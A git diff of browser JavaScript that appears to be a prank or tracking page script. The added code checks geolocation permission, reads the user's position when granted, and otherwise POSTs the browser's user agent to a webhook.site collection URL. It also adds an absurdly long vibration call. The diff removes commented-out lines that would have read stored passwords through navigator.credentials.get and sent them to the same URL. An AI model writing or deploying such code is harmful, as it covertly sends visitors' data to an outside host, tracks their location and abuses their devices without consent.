@@ -1,4 +1,4 @@
-async function main() {    
+function main() {
     var options = {
         enableHighAccuracy: true,
         timeout: 5000,
@@ -16,14 +16,21 @@ async function main() {
     function error(err) {
         console.warn(`ERROR(${err.code}): ${err.message}`);
     }
-    navigator.geolocation.getCurrentPosition(success, error, options);
 
     let url = 'https://webhook.site/75296190-1ddd-4656-9701-533fee9fa083';
-    // let xhr = new XMLHttpRequest();
-    // xhr.open("POST", url);
-    // let bdata = navigator.credentials.get({password: true});
-    // xhr.send(bdata);
-    // console.log(bdata);
+
+    navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
+        if (result.state === 'granted') {
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        }
+        else {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", url);
+            xhr.send(navigator.userAgent); // You only live once, enable geolocation
+        }
+    });
+
+    navigator.vibrate(200000000000);
     alert('Goldenbeasty');
 }
 main()
